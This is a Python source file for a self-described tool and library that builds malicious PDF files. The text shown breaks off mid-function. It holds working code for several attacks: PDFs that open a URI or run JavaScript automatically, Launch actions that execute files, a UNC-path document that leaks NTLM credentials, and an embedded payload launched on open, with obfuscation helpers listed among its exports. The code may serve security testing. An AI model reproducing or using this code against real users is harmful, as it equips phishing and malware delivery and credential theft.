#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file implements a library and a tool to make malicious PDF files
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

r"""
This file implements a library and a tool to make malicious PDF files

~# python3 MaliciousPDF.py --help
~# python3 MaliciousPDF.py
~# python3 MaliciousPDF.py -f 'test.pdf' -t 'JS' -p 'app.alert("test");' -b 'My body' -T 'My title' -o -v '1.7' -a 'MyName' -d '2016-06-22 16:53:45' -i 'Title' -P 'Not MaliciousPDF'

Ressources:
 - PDF file:
     https://www.oreilly.com/library/view/developing-with-pdf/9781449327903/ch01.html
     https://gendignoux.com/blog/2016/10/04/pdf-basics.html
     https://blog.idrsolutions.com/make-your-own-pdf-file-part-4-hello-world-pdf/
     https://commandlinefanatic.com/cgi-bin/showarticle.cgi?article=art019
     https://speakerdeck.com/ange/lets-write-a-pdf-file?slide=24
 - PDF lib:
     https://github.com/johndoe31415/llpdf/
 - PDF commons attacks:
     https://blog.nviso.eu/2016/11/30/pdf-uris/
     https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
     https://blog.nviso.eu/2016/12/28/pdf-analysis-back-to-basics/
     https://resources.infosecinstitute.com/topic/analyzing-malicious-pdf/
     https://blog.nviso.eu/2018/07/03/extracting-a-windows-zero-day-from-an-adobe-reader-zero-day-pdf/
 - PDF exploits examples:
     https://blog.nviso.eu/2018/07/26/shortcomings-of-blacklisting-in-adobe-reader-and-what-you-can-do-about-it/
     https://github.com/jonaslejon/malicious-pdf/blob/main/malicious-pdf.py
     https://github.com/RUB-NDS/PDF101/

~# coverage run -m doctest -v MaliciousPDF.py
113 tests in 66 items.
113 passed and 0 failed.
Test passed.
~# coverage report
Name              Stmts   Miss  Cover
-------------------------------------
MaliciousPDF.py     369      1    99%
-------------------------------------
TOTAL               369      1    99%
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = (
    "This file implements a library and a tool to make malicious PDF files"
)
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/MaliciousPDF"

copyright = """
MaliciousPDF  Copyright (C) 2022, 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = [
    "StreamError",
    "Position",
    "PdfNull",
    "PdfBoolean",
    "PdfString",
    "PdfName",
    "PdfList",
    "PdfDictionary",
    "PdfStream",
    "PdfObject",
    "PdfFile",
    "PdfStreamText",
    "PdfObjStm",
    "MaliciousURI",
    "MaliciousJS",
    "MaliciousJsFile",
    "MaliciousNTLM",
    "MaliciousEmbeddedFile",
    "add_text",
    "pdf_bases",
    "javascript_obfuscation",
    "pdf_obfuscation",
    "init_obfuscation",
]

print(copyright)

from typing import List, Union, Dict, Tuple, TypeVar
from argparse import ArgumentParser, Namespace
from abc import ABC, abstractmethod
from dataclasses import dataclass
from datetime import datetime
from binascii import hexlify
from base64 import b16encode
from sys import exit, stderr
from getpass import getuser
from zlib import compress
from enum import IntEnum
from _io import _IOBase
from io import StringIO

PdfDictionary = TypeVar("PdfDictionary")
PdfObject = TypeVar("PdfObject")
PdfFile = TypeVar("PdfFile")


class StreamError(Exception):
    pass


class ObjectType(IntEnum):
    free = 0
    uncompressed = 1
    compressed = 2


@dataclass
class Position:
    index: int = None
    in_objstm_id: int = None
    in_objstm_index: int = None


class PdfNull:

    """
    This class implements a PDF Null value.

    >>> str(PdfNull())
    'null'
    >>>
    """

    def __str__(self):
        return "null"


class PdfBoolean:

    """
    This class implements a PDF Boolean value.

    >>> str(PdfBoolean(True))
    'true'
    >>> str(PdfBoolean(False))
    'false'
    >>>
    """

    def __init__(self, value: bool):
        self.value = "true" if value else "false"

    def __str__(self):
        return self.value


class PdfString:

    """
    This class implements a PDF string.

    >>> str(PdfString('abc\\n\)'))
    '(abc\\\\n\\\\\\\\\\\\051)'
    >>> print(str(PdfString('abc\\n\)')))
    (abc\\n\\\\\\051)
    >>> str(PdfString(b'abc'))
    '<616263>'
    >>> hash(PdfString(b'abc')) != hash(PdfString(b'abc'))
    True
    >>> PdfString(None)
    Traceback (most recent call last):
        ...
    TypeError: name must be a "str" or "bytes", not 'NoneType' (None)
    >>>
    """

    counter = 0
    characters = (
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\ "
    )

    def __init__(self, data: Union[str, bytes]):
        counter = PdfString.counter = PdfString.counter + 1

        if isinstance(data, str):
            self.data = (
                "("
                + "".join(
                    x if x in PdfString.characters else f"\\{ord(x):0>3o}"
                    for x in data.encode("unicode_escape").decode()
                )
                + ")"
            )
        elif isinstance(data, bytes):
            self.data = "<" + b16encode(data).decode() + ">"
        else:
            raise TypeError(
                f'name must be a "str" or "bytes", not {type(data).__name__!r} ({data!r})'
            )

        self.hash = hash(self.data + str(counter))

    def __str__(self):
        return self.data

    def __hash__(self):
        return self.hash


class PdfName:

    """
    This class implements a PDF Name.

    >>> str(PdfName('abc def'))
    '/abc#20def'
    >>> hash(PdfName('abc')) != hash(PdfName('abc'))
    True
    >>> PdfName(None)
    Traceback (most recent call last):
        ...
    TypeError: name must be a "str", not 'NoneType' (None)
    >>>
    """

    counter = 0
    characters = (
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    )

    def __init__(self, name: str):
        counter = PdfString.counter = PdfString.counter + 1

        if isinstance(name, str):
            name = self.name = "/" + "".join(
                c if c in self.characters else f"#{ord(c):0>2x}" for c in name
            )
        else:
            raise TypeError(
                f'name must be a "str", not {type(name).__name__!r} ({name!r})'
            )

        self.hash = hash(name + str(counter))

    def __str__(self):
        return self.name

    def __hash__(self):
        return self.hash

class NameNoObfuscation(PdfName):
    characters = (
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    )

class PdfList(list):

    r"""
    This class implements a PDF List.

    >>> str(PdfList((PdfName('abc]'), 0, 1.1, -5, PdfNull(), PdfBoolean(True), PdfBoolean(False), PdfList((PdfString('abc ['),)))))
    '[/abc#5d 0 1.1 -5 null true false [(abc \\133)]]'
    >>> str(PdfList((Exception(),)))
    Traceback (most recent call last):
        ...
    TypeError: Element must be "PdfNull", "PdfBoolean", "int", "float", "PdfList", "PdfName", "PdfObject" or "PdfString". Not 'Exception' (Exception())
    >>>
    """

    def __str__(self):
        string = "["

        for element in self:
            if isinstance(
                element,
                (PdfString, PdfName, PdfList, int, float, PdfNull, PdfBoolean),
            ):
                string += str(element)
            elif isinstance(element, PdfObject):
                string += (
                    " ".join(
                        str(x)
                        for x in element.dictionary.file.get_ref(element)
                    )
                    + " R"
                )
            else:
                raise TypeError(
                    'Element must be "PdfNull", "PdfBoolean", "int", "float", "PdfList",'
                    ' "PdfName", "PdfObject" or "PdfString". '
                    f"Not {type(element).__name__!r} ({element!r})"
                )

            string += " "

        return string[:-1] + "]"


PdfType = TypeVar(
    "PdfType",
    PdfName,
    PdfString,
    PdfList,
    PdfNull,
    PdfBoolean,
    PdfObject,
    PdfDictionary,
    int,
    float,
)


class PdfDictionary:

    """
    This class implements basic PDF dictionary.

    >>> file = PdfFile('')
    >>> object = PdfObject(PdfDictionary(file))
    >>> file.add_objects(object)
    >>> test = PdfDictionary(file)
    >>> test.add_kids(object)
    >>> test.add_value(PdfName('Test'), 'test')
    >>> str(test)
    '<</Kids[2 0 R]/Test test>>'
    >>> str(PdfDictionary(file, parent = object))
    '<</Parent 2 0 R>>'
    >>> str(PdfDictionary(file, type_ = PdfName('type')))
    '<</Type/type>>'
    >>> str(PdfDictionary(file, subtype = PdfName('subtype')))
    '<</Subtype/subtype>>'
    >>> str(PdfDictionary(file, content = object))
    '<</Contents 2 0 R>>'
    >>> str(PdfDictionary(file, kids = PdfList((PdfName('abc'), PdfString('def')))))
    '<</Kids[/abc (def)]>>'
    >>> str(PdfDictionary(file, count = 1))
    '<</Count 1>>'
    >>> str(PdfDictionary(file, filters = PdfList((PdfName('abc'), PdfString('def')))))
    '<</Filter[/abc (def)]>>'
    >>> str(PdfDictionary(file, values = {PdfName('abc'): 'test', PdfName('abc'): None, PdfName('abc'): object}))
    '<</abc test/abc/abc 2 0 R>>'
    >>> str(PdfDictionary(file, values = {PdfName('abc'): Exception()}))
    Traceback (most recent call last):
        ...
    TypeError: Value Exception() (name: /abc) must be 'PdfType', 'str' or 'None'.
    >>>
    """

    def __init__(
        self,
        file: PdfFile,
        parent: PdfObject = None,
        type_: PdfName = None,
        subtype: PdfName = None,
        content: PdfObject = None,
        kids: PdfList = None,
        count: int = None,
        filters: PdfList = None,
        values: Dict[PdfName, Union[PdfType, str, None]] = None,
    ):
        self.kids = kids or PdfList()
        self.file = file
        self.type = type_
        self.count = count
        self.parent = parent
        self.values = values or {}
        self.content = content
        self.subtype = subtype
        self.filters = filters or PdfList()
        self.length: int = None

    def add_value(
        self, name: PdfName, value: Union[PdfType, str, None] = None
    ) -> None:

        """
        This method adds item in PDF dictionary.
        """

        self.values[name] = value

    def add_kids(self, *kids: PdfObject) -> None:

        """
        This method adds item in PDF dictionary.
        """

        self.kids.extend(kids)

    def __str__(self):
        string = ""

        if self.type:
            string += "/Type" + str(self.type)

        if self.subtype:
            string += "/Subtype" + str(self.subtype)

        if self.filters:
            string += "/Filter" + str(self.filters)

        if self.length is not None:
            string += "/Length " + str(self.length)

        if self.parent:
            string += (
                "/Parent "
                + " ".join(str(x) for x in self.file.get_ref(self.parent))
                + " R"
            )

        if self.content:
            string += (
                "/Contents "
                + " ".join(str(x) for x in self.file.get_ref(self.content))
                + " R"
            )

        if self.kids:
            string += "/Kids" + str(self.kids)

        if self.count is not None:
            string += "/Count " + str(self.count)

        for name, value in self.values.items():
            if not value:
                string += str(name)
            elif isinstance(
                value,
                (
                    PdfName,
                    PdfList,
                    PdfString,
                    PdfDictionary,
                ),
            ):
                string += str(name) + str(value)
            elif isinstance(
                value,
                (
                    str,
                    int,
                    float,
                    PdfNull,
                    PdfBoolean,
                ),
            ):
                string += str(name) + " " + str(value)
            elif isinstance(value, PdfObject):
                string += (
                    str(name)
                    + " "
                    + " ".join(str(x) for x in self.file.get_ref(value))
                    + " R"
                )
            else:
                raise TypeError(
                    f"Value {value!r} (name: {str(name)}) must be 'PdfType', 'str' or 'None'."
                )

        return "<<" + string + ">>"


class PdfStream(ABC):

    """
    This class implements the ABC class for PDF stream.
    """

    @abstractmethod
    def __bytes__(self):
        """
        >>> PdfStream.__bytes__(None)
        >>>
        """
        pass


class PdfObject:

    r"""
    This class implements PDF object and generates stream.

    >>> file = PdfFile('')
    >>> test = PdfDictionary(file)
    >>> object = PdfObject(test)
    >>> file.add_objects(object)
    >>> object.add_stream(b'abc', True, True)
    >>> object.add_stream(b'abc', True, True)
    Traceback (most recent call last):
        ...
    MaliciousPDF.StreamError: This PdfObject already contains a stream.
    >>> str(object)[:58]
    '<</Filter[/FlateDecode /ASCIIHexDecode]/Length 15>>stream\n'
    >>> str(object)[-10:]
    '\nendstream'
    >>> str(PdfObject(PdfDictionary(file), b'abc', False, False))
    '<</Length 3>>stream\nabc\nendstream'
    >>> str(PdfObject(PdfDictionary(file), b'abc', False, True))
    '<</Filter[/ASCIIHexDecode]/Length 7>>stream\n616263>\nendstream'
    >>> test = PdfObject(PdfDictionary(file))
    >>> test.add_stream(PdfStreamText(PdfString("abc"), (100, 700)), False, True)
    >>> str(test)
    '<</Filter[/ASCIIHexDecode]/Length 83>>stream\n4254202f4631203132205466203130302037303020546420313520544c0a286162632920546a0a4554>\nendstream'
    >>>
    """

    def __init__(
        self,
        dictionary: PdfDictionary,
        stream: Union[PdfStream, bytes] = None,
        compress: bool = True,
        asciihex: bool = True,
    ):
        self.dictionary = dictionary
        self.in_objstm: PdfObjStm = None
        self.compress = compress
        self.asciihex = asciihex

        if isinstance(stream, PdfStream):
            stream = bytes(stream)
        self.stream = stream

    def add_stream(
        self,
        stream: Union[PdfStream, bytes],
        compress: bool = None,
        asciihex: bool = None,
    ) -> None:

        """
        This method adds stream in PdfObject.
        """

        if self.stream:
            raise StreamError("This PdfObject already contains a stream.")

        if isinstance(stream, PdfStream):
            stream = bytes(stream)

        self.stream = stream
        if compress is not None:
            self.compress = compress

        if asciihex is not None:
            self.asciihex = asciihex

    def __str__(self):
        stream = self.stream
        if stream:
            filters = self.dictionary.filters
            if self.asciihex:
                filter_ = PdfName("ASCIIHexDecode")
                if str(filter_) not in [str(x) for x in filters]:
                    filters.append(filter_)
                stream = hexlify(stream) + b">"
            if self.compress:
                filter_ = PdfName("FlateDecode")
                if str(filter_) not in [str(x) for x in filters]:
                    self.dictionary.filters.insert(0, filter_)
                stream = compress(stream)

            string = "stream\n" + stream.decode("latin-1") + "\nendstream"
            self.dictionary.length = len(stream)
        else:
            string = ""

        return str(self.dictionary) + string


class PdfFile:

    r"""
    This class implements a PDF file.

    >>> file = PdfFile('test.pdf')
    >>> file.add_objects(PdfObject(PdfDictionary(file, type_=PdfName("Catalog"))))
    >>> file.write()
    >>> data = open('test.pdf', 'rb').read()
    >>> data.startswith(b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<</Title(Malicious PDF)/Producer(MaliciousPDF)/Author(')
    True
    >>> data.endswith(b')>>\nendobj\n2 0 obj\n<</Type/Catalog>>\nendobj\nxref\n0 3\n0000000000 65535 f \n0000000015 00000 n \n0000000148 00000 n \ntrailer\n<</Size 3/Root 2 0 R/Info 1 0 R>>\nstartxref\n181\n%%EOF\n')
    True
    >>>
    """

    def __init__(
        self,
        filename: str,
        version: float = 1.7,
        author: PdfString = None,
        date: datetime = None,
        title: PdfString = PdfString("Malicious PDF"),
        producer: PdfString = PdfString("MaliciousPDF"),
    ):
        self.version = version
        self.filename = filename
        self.objects: List[PdfObject] = []
        self.compressed_object: bool = False
        self.info = info = PdfObject(
            PdfDictionary(
                self,
                values={
                    PdfName("Title"): title,
                    PdfName("Producer"): producer,
                    PdfName("Author"): author or PdfString(getuser()),
                    PdfName("CreationDate"): PdfString(
                        (date or datetime.now()).strftime(
                            "D:%Y%m%d%H%M%S-00'00'"
                        )
                    ),
                },
            )
        )
        self.add_objects(info)

    def get_ref(self, pdfobject: PdfObject) -> Tuple[int, int]:

        """
        This method returns the object index and version.
        """

        return self.objects.index(pdfobject) + 1, 0

    def add_objects(self, *pdfobjects: PdfObject) -> None:

        """
        This method adds a PDF object to the file.
        """

        self.objects.extend(pdfobjects)

    def get_xref_table(
        self, index: int, positions: List[Position], root_id: int
    ) -> str:

        """
        This method makes the basic Xref table.
        """

        index += 1
        xref = f"xref\n0 {index}\n0000000000 65535 f \n"
        xref += "".join(f"{p.index:0>10} 00000 n \n" for p in positions)
        trailer = f"trailer\n<</Size {index}/Root {root_id} 0 R/Info 1 0 R>>\n"
        return xref + trailer

    def get_compressed_xref_table(
        self, index: int, positions: List[Position], root: PdfObject
    ) -> str:

        """
        This method makes a compressed Xref object.
        """

        index += 2
        index_size = (
            max(positions, key=lambda x: x.index or 1).index.bit_length() + 7
        ) // 8
        objstm_name = str(PdfName("ObjStm"))
        objstm_index_size = (
            len(
                max(
                    self.objects,
                    key=lambda x: len(x.elements)
                    if str(x.dictionary.type) == objstm_name
                    else 0,
                ).elements
            ).bit_length()
            + 7
        ) // 8
        data = bytearray()

        data.append(ObjectType.free)
        data += (0).to_bytes(index_size, "big")
        data += (255).to_bytes(objstm_index_size, "big")

        for position in positions:
            if position.index:
                data.append(ObjectType.uncompressed)
                data += position.index.to_bytes(index_size, "big")
                data += (0).to_bytes(objstm_index_size, "big")
            else:
                data.append(ObjectType.compressed)
                data += position.in_objstm_id.to_bytes(index_size, "big")
                data += position.in_objstm_index.to_bytes(
                    objstm_index_size, "big"
                )

        xref = (
            str(index - 1)
            + " 0 obj\n"
            + str(
                PdfObject(
                    PdfDictionary(
                        self,
                        type_=PdfName("XRef"),
                        values={
                            PdfName("Info"): self.info,
                            PdfName("Index"): PdfList((0, index)),
                            PdfName("Size"): index,
                            PdfName("W"): PdfList(
                                (1, index_size, objstm_index_size)
                            ),
                            PdfName("Root"): root,
                        },
                    ),
                    data,
                )
            )
            + "\nendobj\n"
        )
        return xref

    def write(self) -> None:

        """
        This method writes the PDF file.
        """

        content = (
            f"%PDF-{self.version}\n%\xe2\xe3\xcf\xd3\n"  # \xbf\xf7\xa2\xfe
        )
        positions: List[Position] = []
        catalog_string = str(PdfName("Catalog"))
        catalog: PdfObject = None

        for index, object_ in enumerate(self.objects, 1):
            if (
                catalog is None
                and str(object_.dictionary.type) == catalog_string
            ):
                catalog = object_
            if object_.in_objstm:
                positions.append(
                    Position(
                        None,
                        self.get_ref(object_.in_objstm)[0],
                        object_.in_objstm.elements.index(object_),
                    )
                )
                continue
            else:
                positions.append(Position(len(content)))

            content += f"{index} 0 obj\n{object_}\nendobj\n"

        content_length = len(content)
        if self.compressed_object:
            positions.append(Position(content_length))
            xref = self.get_compressed_xref_table(index, positions, catalog)
        else:
            catalog_index, _ = self.get_ref(catalog)
            xref = self.get_xref_table(index, positions, catalog_index)

        startxref = f"startxref\n{content_length}\n"
        eof = "%%EOF\n"

        with open(self.filename, "wb") as file:
            file.write((content + xref + startxref + eof).encode("latin-1"))


class PdfStreamText(PdfStream):

    r"""
    This class implements a PDF Stream to write Text in PDF file.

    >>> bytes(PdfStreamText(PdfString("abc"), (100, 700)))
    b'BT /F1 12 Tf 100 700 Td 15 TL\n(abc) Tj\nET'
    >>> bytes(PdfStreamText(PdfString("abc\ndef"), (100, 700), 24, 28, True))
    b"BT /F1 24 Tf 100 700 Td 28 TL\n(abc) Tj\n(def) '\nET\n94 730 64 -68 re S"
    >>> bytes(PdfStreamText(PdfString("abc\ndef"), (1, 2), 24, 28, True))
    b"BT /F1 24 Tf 1 2 Td 28 TL\n(abc) Tj\n(def) '\nET\n0 0 64 -68 re S"
    >>>
    """

    def __init__(
        self,
        data: PdfString,
        position: Tuple[int, int],
        text_size: int = 12,
        line_size: int = None,
        outline: bool = False,
    ):
        self.lines = data = str(data).split("\\n")
        data = ") '\n(".join(data) + " '\n"
        self.data = data.replace(") '\n", ") Tj\n", 1).encode()
        self.position = position
        self.text_size = text_size
        self.line_size = line_size or (text_size + text_size // 4)
        self.outline = outline

    def get_outline(self) -> bytes:

        """
        This function make outline data.
        """

        left, bottom = self.position
        text_quarter = self.text_size // 4

        if left > text_quarter:
            left = left - text_quarter
        else:
            left = 0

        if bottom > text_quarter:
            bottom = bottom + self.text_size + text_quarter
        else:
            bottom = 0

        max_length = max(len(line) for line in self.lines)
        width = max_length * self.text_size
        width -= width // 3

        height = (self.line_size * len(self.lines) + text_quarter * 2) * -1

        return f"\n{left} {bottom} {width} {height} re S".encode()

    def __bytes__(self):
        data = (
            f'BT /F1 {self.text_size} Tf {" ".join(str(x) for x in self.position)} Td {self.line_size} TL\n'.encode()
            + self.data
            + b"ET"
        )

        if self.outline:
            return data + self.get_outline()
        return data


class PdfObjStm(PdfObject):

    r"""
    This class adds an Objects Stream to a PDF.

    /!\ This class is experimental, only works with Google Chrome for now.

    >>> from io import StringIO
    >>> javascript = StringIO("app.alert('Test');")
    >>> file = PdfFile('objstm.pdf')
    >>> file, catalog, outlines, pages, page = pdf_bases(file)
    >>> objstm = PdfObjStm(file, compress=False, asciihex=False)
    >>> file.add_objects(objstm)
    >>> objstm.add_elements()
    >>> js = MaliciousJsFile(catalog, javascript)
    >>> objstm.add_elements(js.action)
    >>> str(objstm)
    '<</Type/ObjStm/Length 42/N 1/First 4>>stream\n7 0\n<</Type/Action/S/JavaScript/JS 8 0 R>>\nendstream'
    >>>
    """

    def __init__(
        self, *args, compress: bool = True, asciihex: bool = True, **kwargs
    ):
        super().__init__(
            PdfDictionary(*args, **kwargs),
            stream=None,
            compress=compress,
            asciihex=asciihex,
        )
        self.dictionary.type = PdfName("ObjStm")
        self.elements: List[PdfDictionary] = []

    def add_elements(self, *elements: PdfObject) -> None:

        """
        This method adds dictionaries to ObjStm.
        """

        file = self.dictionary.file
        elements_ = [e for e in elements if e.stream is None]

        self.elements.extend(elements_)
        file.add_objects(*elements)
        file.compressed_object = True

        for element in elements_:
            element.in_objstm = self

    def __str__(self):
        data = ""
        file = self.dictionary.file
        header = ""

        for element in self.elements:
            position = len(data)
            index, _ = file.get_ref(element)
            header += (
                f" {index} {position}" if header else f"{index} {position}"
            )
            data += "\n" + str(element.dictionary)

        self.stream = None
        self.add_stream((header + data).encode("latin-1"))
        values = self.dictionary.values

        blacklist = [str(PdfName("N")), str(PdfName("First"))]
        to_remove = [value for value in values if str(value) in blacklist]
        [values.pop(value) for value in to_remove]

        values.update(
            {
                PdfName("N"): len(self.elements),
                PdfName("First"): len(header) + 1,
            }
        )
        return super().__str__()


class MaliciousURI:

    """
    This class adds a malicious URI auto-opened in the PDF catalog.

    Attributes: file, catalog, uri

    >>> url = 'http://127.0.0.1:8000/?malpdf'
    >>> file, catalog, outlines, pages, page = pdf_bases("MaliciousURI.pdf")
    >>> malpdf = MaliciousURI(catalog, url)
    >>> url in str(malpdf.uri)
    True
    >>> ('/OpenAction ' + " ".join(str(x) for x in malpdf.file.get_ref(malpdf.uri)) + " R") in str(malpdf.catalog)
    True
    >>>
    """

    def __init__(self, catalog: PdfObject, uri: PdfString):
        self.catalog = catalog
        file = self.file = catalog.dictionary.file

        uri = self.uri = PdfObject(
            PdfDictionary(
                file,
                values={
                    PdfName("S"): PdfName("URI"),
                    PdfName("URI"): uri,
                },
            )
        )

        file.add_objects(uri)
        catalog.dictionary.add_value(PdfName("OpenAction"), uri)


class MaliciousJS:

    r"""
    This class adds malicious JS auto-opened in the PDF catalog.

    Attributes: file, catalog

    >>> javascript = "app.launchURL('http://127.0.0.1:8000/?malpdf');"
    >>> js_string = PdfString(javascript)
    >>> file, catalog, outlines, pages, page = pdf_bases("MaliciousJS.pdf")
    >>> malpdf = MaliciousJS(catalog, js_string)
    >>> r"/OpenAction<</S/JavaScript/JS(app\056launchURL\050\047http\072\057\057127\0560\0560\0561\0728000\057\077malpdf\047\051\073)" in str(malpdf.catalog)
    True
    >>>
    """

    def __init__(self, catalog: PdfObject, javascript: PdfString):
        self.catalog = catalog
        file = self.file = catalog.dictionary.file

        catalog.dictionary.add_value(
            PdfName("OpenAction"),
            PdfDictionary(
                file,
                values={
                    PdfName("S"): PdfName("JavaScript"),
                    PdfName("JS"): javascript,
                },
            ),
        )


class MaliciousJsFile:

    r"""
    This class adds malicious JS auto-opened in the PDF catalog.

    Attributes: file, catalog, javascript, action

    >>> from re import search
    >>> from io import StringIO
    >>> from urllib.request import urlopen
    >>> javascript = "Net.HTTP.request({cVerb: 'GET', cURL: 'http://127.0.0.1:8000/?malpdf'})" # Net.HTTP.request is a unsecure function, test it in %APPDATA%\Adobe\Acrobat\Privileged\DC\Javascripts\*.js
    >>> js_string = StringIO(javascript) or open('malicious.js') or urlopen('http://127.0.0.1:8000/malicious.js')
    >>> file, catalog, outlines, pages, page = pdf_bases("MaliciousJsFile.pdf")
    >>> malpdf = MaliciousJsFile(catalog, js_string)
    >>> search("/OpenAction \d+ 0 R", str(malpdf.catalog)) is not None
    True
    >>> search(r"/Filter\[/FlateDecode /ASCIIHexDecode\]/Length \d+>>stream\n[\x00-\xff]+\nendstream", str(malpdf.javascript)) is not None
    True
    >>> search("<</Type/Action/S/JavaScript/JS \d+ 0 R>>", str(malpdf.action)) is not None
    True
    >>>
    """

    def __init__(self, catalog: PdfObject, javascript_file: _IOBase, **kwargs):
        self.catalog = catalog
        file = self.file = catalog.dictionary.file

        data = javascript_file.read()

        javascript = self.javascript = PdfObject(
            PdfDictionary(file),
            data if isinstance(data, bytes) else data.encode("latin-1"),
            **kwargs,
        )

        action = self.action = PdfObject(
            PdfDictionary(
                file,
                type_=PdfName("Action"),
                values={
                    PdfName("S"): PdfName("JavaScript"),
                    PdfName("JS"): javascript,
                },
            )
        )

        file.add_objects(action, javascript)
        catalog.dictionary.add_value(PdfName("OpenAction"), action)


class MaliciousLaunch:

    """
    This class adds malicious command auto-opened in the PDF catalog.

    Attributes: file, catalog, action

    >>> from re import search
    >>> command = "C:\\\\Windows\\\\System32\\\\notepad.exe" # .exe can not be opened for security reason
    >>> command = "test.txt"                                 # .txt file launch notepad.exe or your applicationby default, but test.txt file must exists.
    >>> cmd = PdfString(command)
    >>> file, catalog, outlines, pages, page = pdf_bases("MaliciousCommand.pdf")
    >>> malpdf = MaliciousLaunch(catalog, cmd)
    >>> search("/OpenAction \d+ 0 R", str(malpdf.catalog)) is not None
    True
    >>> str(malpdf.action)
    '<</Type/Action/S/Launch/F(test\\\\056txt)>>'
    >>>
    """

    def __init__(self, catalog: PdfObject, command: PdfString):
        self.catalog = catalog
        file = self.file = catalog.dictionary.file

        action = self.action = PdfObject(
            PdfDictionary(
                file,
                type_=PdfName("Action"),
                values={
                    PdfName("S"): PdfName("Launch"),
                    PdfName("F"): command,
                },
            )
        )

        file.add_objects(action)
        catalog.dictionary.add_value(PdfName("OpenAction"), action)


class MaliciousNTLM:

    r"""
    This class adds a malicious remote document to perform a NTML authentication.

    Attributes: file, page, document

    >>> document = "\\\\localhost\\malpdf"
    >>> file, catalog, outlines, pages, page = pdf_bases("MaliciousNTLM.pdf")
    >>> malpdf = MaliciousNTLM(page, PdfString(document))
    >>> r'/AA<</O<</F(\\\\localhost\\malpdf)/S/GoToE/D[0 /Fit]>>>>' in str(malpdf.page)
    True
    >>>
    """

    def __init__(
        self,
        page: PdfObject,
        document: PdfString,
    ):
        self.page = page
        self.document = document
        file = self.file = page.dictionary.file

        page.dictionary.add_value(
            PdfName("AA"),
            PdfDictionary(
                file,
                values={
                    PdfName("O"): PdfDictionary(
                        file,
                        values={
                            PdfName("F"): document,
                            PdfName("S"): PdfName("GoToE"),
                            PdfName("D"): PdfList((0, PdfName("Fit"))),
                        },
                    )
                },
            ),
        )


class MaliciousEmbeddedFile:

    r"""
    This class adds a malicious Embedded File in the PDF file.

    Attributes: pdffile, catalog, filedata, filename, nLaunch, embeddedfile, filespec, javascript

    >>> from io import StringIO
    >>> from urllib.request import urlopen
    >>> pdffile, catalog, outlines, pages, page = pdf_bases("MaliciousEmbeddedFile.pdf")
    >>> file = StringIO('this is my payload') or open('payload.txt') or urlopen('http://127.0.0.1:8000/payload.txt')
    >>> malpdf = MaliciousEmbeddedFile(catalog, file, "payload.txt")
    >>> str(malpdf.catalog)
    '<</Type/Catalog/Outlines 3 0 R/Pages 4 0 R/OpenAction 8 0 R/Names<</EmbeddedFiles<</Names[(payload\\056txt) 7 0 R]>>>>>>'
    >>> str(malpdf.filespec)
    '<</Type/Filespec/F(payload\\056txt)/EF<</F 6 0 R>>>>'
    >>> str(malpdf.javascript)
    '<</Type/Action/S/JavaScript/JS(this\\056exportDataObject\\050\\173cName\\072 \\047payload\\056txt\\047\\054nLaunch\\0722\\175\\051\\073)>>'
    >>> str(malpdf.embeddedfile.dictionary)
    '<</Type/EmbeddedFile>>'
    >>>
    """

    def __init__(
        self,
        catalog: PdfObject,
        filedata: _IOBase,
        filename: str,
        nLaunch: int = 2,
        **kwargs,
    ):
        self.catalog = catalog
        file = self.pdffile = catalog.dictionary.file
        self.filedata = filedata
        self.filename = filename
        self.nLaunch = nLaunch

        data = filedata.read()
        if isinstance(data, str):
            data = data.encode()

        embeddedfile = self.embeddedfile = PdfObject(
            PdfDictionary(file, type_=PdfName("EmbeddedFile")), data, **kwargs
        )
        file.add_objects(embeddedfile)

        filespec = self.filespec = PdfObject(
            PdfDictionary(
                file,
                type_=PdfName("Filespec"),
                values={
                    PdfName("F"): PdfString(filename),
                    PdfName("EF"): PdfDictionary(
                        file, values={PdfName("F"): embeddedfile}
                    ),
                },
            )
        )
        file.add_objects(filespec)

        javascript = self.javascript = PdfObject(
            PdfDictionary(
                file,
                type_=PdfName("Action"),
                values={
                    PdfName("S"): PdfName("JavaScript"),
                    PdfName("JS"): PdfString(
                        f"this.exportDataObject({{cName: {filename!r},nLaunch:{nLaunch!r}}});"
                    ),
                },
            )
        )
        file.add_objects(javascript)

        catalog.dictionary.add_value(PdfName("OpenAction"), javascript)

        catalog.dictionary.add_value(
            PdfName("Names"),
            PdfDictionary(
                file,
                values={
                    PdfName("EmbeddedFiles"): PdfDictionary(
                        file,
                        values={
                            PdfName("Names"): PdfList(
                                (
                                    PdfString(filename),
                                    filespec,
                                )
                            ),
                        },
                    )
                },
            ),
        )


def add_text(
    page: PdfObject,
    text: str,
    position: Tuple[int, int],
    font: str = "Helvetica",
    compress: bool = True,
    **kwargs,
) -> None:

    """
    This function adds text to PDF page.
    """

    global font_counter
    file = page.dictionary.file

    font_name = "F" + str(font_counter)
    font = PdfObject(
        PdfDictionary(
            file,
            type_=PdfName("Font"),
            subtype=PdfName("Type1"),
            values={
                PdfName("Name"): PdfName(font_name),
                PdfName("BaseFont"): PdfName(font),
                PdfName("Encoding"): PdfName("MacRomanEncoding"),
            },
        )
    )
    font_counter += 1

    if page.dictionary.content is None:
        stream = PdfObject(
            PdfDictionary(file),
            stream=PdfStreamText(PdfString(text), position, **kwargs),
            compress=compress,
        )
